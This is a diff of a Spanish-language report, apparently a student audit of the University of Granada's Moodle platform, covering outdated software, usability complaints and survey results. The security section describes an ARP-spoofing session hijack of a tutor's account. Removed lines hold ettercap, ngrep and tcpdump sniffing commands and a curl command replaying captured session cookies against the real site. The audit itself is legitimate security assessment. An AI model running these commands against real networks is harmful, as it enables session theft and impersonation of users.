@@ -20,10 +20,9 @@ En cuanto al motor de base de datos, desde el CEVUG nos comentaron que utilizaba
 \label{redireccionhttp}
 \end{figure}
 
+Las versiones antiguas de moodle utilizaban la librería YUI desarrollada por Yahoo cuyo desarrollo se abandonó el 29 de agosto de 2014 \cite{art_01} y a partir de la 2.9 se comenzó a migrar a la librería jQuery. Aunque moodle 2.6 utiliza YUI la plantilla Archaius usa varias funciones de la librería jQuery 1.10.2 \url{https://prado.ugr.es/moodle/theme/jquery.php/core/jquery-1.10.2.min.js} que fue liberada el 3 de Julio de 2013 y que teniendo en cuenta que la librería está ya por su versión 3.2 vemos que está claramente obsoleta.
 
-Las versiones antiguas de moodle utilizaban la librería YUI desarrollada por Yahoo que fue declarada obsoleta el 29 de agosto de 2014 \cite{art_01} y a partir de la 2.9 se comenzó a migrar a la librería jQuery. Aunque moodle 2.6 utiliza YUI la plantilla Archaius usa varias funciones de la librería jQuery 1.10.2 \url{https://prado.ugr.es/moodle/theme/jquery.php/core/jquery-1.10.2.min.js} que fue liberada el 3 de Julio de 2013 y que teniendo en cuenta que la librería está ya por su versión 3.2 vemos que está claramente desactualizada.
-
-Se está Apache como servidor HTTP, notar que se oculta su versión haciéndolo mas seguro ante posibles ataques dirigidos, esto es un acierto.
+Se está utilizando Apache como servidor HTTP, notar que se oculta su versión haciéndolo mas seguro ante posibles ataques dirigidos, esto es un acierto.
 
 El servidor tiene instalada la versión 5.4.45 que fue liberada el 3 de septiembre de 2015 y que como podemos ver en \url{http://php.net/supported-versions.php} ya no está soportada. En este caso hay dos problemas, por un lado el usar una versión tan anticuada de PHP y por otra no ocultar la versión, siendo muy fácil encontrar vulnerabilidades para dicha versión.
 
@@ -39,14 +38,11 @@ Además los distintos usuarios nos hicieron notar los siguientes problemas y/o c
 
 \begin{enumerate}
 
-
 \item No se puedes desmatricular de asignaturas de otros cursos o de las que el alumno ha cambiado de grupo
-
 
 \item Aunque se entre en inglés hay muchas cosas que aparecen en castellano, de hecho están mezclados ambos idiomas
 
 \item La ventana de solicitud de contraseña de prado2 (el IDP del CSIRC) coge la configuración de idioma del navegador del usuario en lugar de la que viene de prado, esto hace que si por ejemplo tu navegador está en inglés pero tu estás mostrando prado en español, al acceder al IDP la ventana se mostrará en inglés.
-
 
 \item Hay que bajar los materiales de la asignatura uno a uno en lugar de dar una opción para descargar todo el conjunto
 
@@ -70,7 +66,7 @@ Además los distintos usuarios nos hicieron notar los siguientes problemas y/o c
 
 \item No se notifica la convocatorias de exámenes.
 
-\item El sistema de mensajería es complicado de encontrar y mucho mas complicado de usar, primeramente el profesor ha de marcar uno a uno los alumnos no habiendo una opción para seleccionarlos todos, luego en lugar de aparecer un botón que ponga "Enviar mensaje" aparece un desplegable cuya única opción es "Enviar mensaje" (ver imagen \ref{fig:pantallazoPradoenviarMensaje}), al darle a esa opción pasamos a una ventana donde podemos redactar el mensaje aunque las opciones de insertar elementos no funcionan correctamente. En la parte inferior de ese mensaje vemos que aparece de nuevo toda la lista de alumnos sin respetar los que se habían marcado previamente. Al enviar el mensaje el profesor no recibe una copia pese a haberse marcado, con lo que no puede comprobar que efectivamente se está enviado el correo a todos los alumnos. El editor de mensajes no deja copiar/pegar con el botón derecho del ratón aunque si que deja hacerlo mediante atajos de teclado y por último y no menos importante no permite editar el asunto del mensaje. Si además sucede algún problema al enviar mensajes a los alumnos nos podemos encontrar con un críptico mensaje de error como el de la figura \ref{fig:pantallazoPradoMensaje2} que reza "Algo ha ido mal al enviar mensajes a los usuarios seleccioandos. Algunos pueden haber recibido el mensaje".
+\item El sistema de mensajería es complicado de encontrar y mucho mas complicado de usar, primeramente el profesor ha de marcar uno a uno los alumnos no habiendo una opción para seleccionarlos todos, luego en lugar de aparecer un botón que ponga "Enviar mensaje" aparece un desplegable cuya única opción es "Enviar mensaje" (ver imagen \ref{fig:pantallazoPradoenviarMensaje}), al darle a esa opción pasamos a una ventana donde podemos redactar el mensaje aunque las opciones de insertar elementos no funcionan correctamente. En la parte inferior de ese mensaje vemos que aparece de nuevo toda la lista de alumnos sin respetar los que se habían marcado previamente. Al enviar el mensaje el profesor no recibe una copia pese a haberse marcado, con lo que no puede comprobar que efectivamente se está enviado el correo a todos los alumnos. El editor de mensajes no deja copiar/pegar con el botón derecho del ratón aunque si que deja hacerlo mediante atajos de teclado y por último y no menos importante no permite editar el asunto del mensaje. Si además sucede algún problema al enviar mensajes a los alumnos nos podemos encontrar con un críptico mensaje de error como el de la figura \ref{fig:pantallazoPradoMensaje2} que reza "Algo ha ido mal al enviar mensajes a los usuarios seleccionados. Algunos pueden haber recibido el mensaje".
 
 
 \begin{figure}[h!]
@@ -156,14 +152,14 @@ Durante el tiempo que estuvo operativa la encuesta recibimos un total de 617 res
 
   \item \textbf{Selección de la titulación} 
   
-  Debido al carácter de este proyecto esperábamos una mayoría de participantes de estudiantes de carreras impartidas en la ETSIIT como pueden ser el Grado de Ingeniería Informática, el Grado de Ingeniería en Tecnologías de Telecomunicación y el Doble Grado en Ingenierdía Informática y Matemáticas, pero nos ha sorprendido ver la alta participación de otros estudios como pueden ser Administración y Direccion de Empresas, Medicina y Psicología por nombrar las titulaciones mas representativos de las casi 70 participantes.
+  Debido al carácter de este proyecto esperábamos una mayoría de participantes de estudiantes de carreras impartidas en la ETSIIT como pueden ser el Grado de Ingeniería Informática, el Grado de Ingeniería en Tecnologías de Telecomunicación y el Doble Grado en Ingeniería Informática y Matemáticas, pero nos ha sorprendido ver la alta participación de otros estudios como pueden ser Administración y Dirección de Empresas, Medicina y Psicología por nombrar las titulaciones mas representativos de las casi 70 participantes.
   
   \includegraphics[width=0.8\textwidth]{../charts/02_titulacion}
 
 
   \item \textbf{¿Con qué periodicidad accede a Prado2?} 
   
-  La mayoría de los usuarios acceden a la plataforma con mucha frecuencia lo que refuerza nuestra opinión de que por un lado se tiene que optimizar la plataforma para que esos accesos sean lo mas breves y satisfactorios posibles, muchos de estos accesos se reducirían si el sistema notificara via e-mail o via aplicación movil que hay novedades interesante en la plataforma. De igual manera se reduciría carga en el servidor si se supiera que los documentos subidos por el profesor no han subido cambios y no hubiera que descargarlos de nuevo para comprobarlo manualmente.
+  La mayoría de los usuarios acceden a la plataforma con mucha frecuencia lo que refuerza nuestra opinión de que por un lado se tiene que optimizar la plataforma para que esos accesos sean lo mas breves y satisfactorios posibles, muchos de estos accesos se reducirían si el sistema notificara vía e-mail o a través de un aplicación móvil si hay alguna actividad nueva en mis cursos. De igual manera se reduciría carga en el servidor si se supiera que los documentos subidos por el profesor no han subido cambios y no hubiera que descargarlos de nuevo para comprobarlo manualmente.
 
   
   
@@ -189,7 +185,7 @@ En cuanto a actividades podemos ver que al igual que en las instalaciones de moo
 
 Aunque moodle tiene actividades que podrían ser muy útiles, como pueden ser los paquetes SCORM e IMS, el desconocimiento y/o la falta de formación hace que la gente ignore para que sirven.
 
-Igual pasa con algunas tareas espécificas creadas para la UGR como pueden ser las clases grabadas (GA3), aunque si hay tareas que son necesarias aunque tengan muy poca utilización como pueden ser la selección de grupo de prácticas al inicio del curso y el control de asistencia.
+Igual pasa con algunas tareas específicas creadas para la UGR como pueden ser las clases grabadas (GA3), aunque si hay tareas que son necesarias aunque tengan muy poca utilización como pueden ser la selección de grupo de prácticas al inicio del curso y el control de asistencia.
 
 
 \begin{figure}[H]
@@ -389,7 +385,13 @@ Aplicacion movil
 
 \section{Análisis de seguridad}
 
+Lo primero que nos llama la atención al realizar la auditoría de seguridad es que la página funciona sobre http, probamos a cargar la página con https y vemos que la página tiene instalado un certificado válido. El motivo de no forzar el protocolo https quizá sea por incompatibilidades de la plantilla, ya que hemos leíd que han arreglado problemas relativos a esto\cite{art_11}. 
 
+\bigskip
+Miramos el código fuente de la página y vemos que se están enlazando de manera absoluta hacia http los archivos CSS, esto es lo que hace que la página no se vea correctamente al acceder por https ya que el navegador bloquea las conexiones no https por seguridad. Esto es algo que se resolvería de forma bastante sencilla y evitaría el problema de secuestro se sesión.
+
+\bigskip
+Una vez lanzado el programa ettercap le pedimos al tutor que se conectara a Prado y a los pocos segundos obtuvimos el resultado que se puede ver en la figura \ref{fig:ettercap}, en unos pocos segundos y aun estando dentro de una red wifi con cifrado WPA2 pudimos realizar el ataque de ARP Spoofing sin ningún problema. Finalmente obtuvimos las variables de sesión \textbf{MOODLEID1\_}, \textbf{SimpleSAMLSessionID-sp} y \textbf{SimpleSAMLAuthToken}, las cuales copiamos en nuestro navegador con un editor de cookies y de inmediato podíamos navegar suplantando la identidad del tutor.
 
 \begin{figure}[H]
 \centering
@@ -398,63 +400,11 @@ Aplicacion movil
 \label{ettercap}
 \end{figure}
 
+\bigskip 
+Hay que tener en cuenta que para iniciar sesión se utiliza el IDP del CSIRC, que si funciona a través de https por lo que en ningún momento podríamos capturar la contraseña del usuario como si se podría hacer si la página de login funcionara a través de http.
 
-
-\begin{verbatim}
-
-MOODLEID1_ cookie
-
-ngrep
-
-
-
-sudo ngrep -q "^GET .* HTTP/1.[01] "host prado.ugr.es"
-
-MOODLEID1_
-
-
-sudo tcpdump -I -i en0 -s 0 -B 524288 -w eduroam.pcap
-
-sudo ngrep -q "^GET .* HTTP/1.[01].*MOODLEID1_=" "host prado.ugr.es" -I eduroam.pcap
-
-
-arp spoofing
-
-
-
-sudo ettercap -T -i en0 -P autoadd -M arp ///80 -e "^GET /moodle/ HTTP/1.[01].*MOODLEID1_=" -t tcp
-
-
-curl -v --cookie " MoodleSession=1k3arpnhojmnjh0rv3ckuee7m2; MOODLEID1%25AB%25FE%2589%25D2O%25D7%2513; SimpleSAMLSessionID-sp=c77c96971496cb79b0f2d5b0ead74452; SimpleSAMLAuthToken=_07cd74595444d3f665543a8af7ebb20b16e7352e94;" http://prado.ugr.es/moodle/
-
-\url{https://es.wikipedia.org/wiki/ARP_Spoofing}
-
-\url{http://insecure.org/sploits/arp.games.html}
-
-title="Ver perfil">ERNESTO SERRANO COLLADO</a>
-
-Todo software se desarrolla para cubrir una necesidad, por lo que en este apartado vamos a describir los requisitos que se estiman necesarios para cubrir los objetivos propuestos.
-
-\url{https://github.com/TUM-MZ/moodle-block_material-download}
-
-fijarse en estas encuestas
-
-\url{http://stackoverflow.com/insights/survey/2017/ }
-
-
-
-sobre https
-\url{http://www.elladodelmal.com/2017/04/presto-parking-un-sitio-web-pci.html}
-
-
-corregidas vulnerabilidades en moodle
-\url{http://unaaldia.hispasec.com/2017/04/corregidas-cuatro-vulnerabilidades-en.html}
-
-\end{verbatim}
-
-
-
-
+\bigskip
+También es un pequeño problema de seguridad el permitir acceder a ficheros README, CHANGELOG y demás, pues esto permite a un posible atacante conocer la versión que se está ejecutando y realizar un ataque utilizando vulnerabilidades conocidas. Si la plataforma se mantuviera constantemente actualizada esto no sería un problema, pero si se va congelar en una versión antigua y sin soporte lo mejor es 'fortificar' la instalación para evitar males mayores.
 
 \section{Análisis de disponibilidad}
 
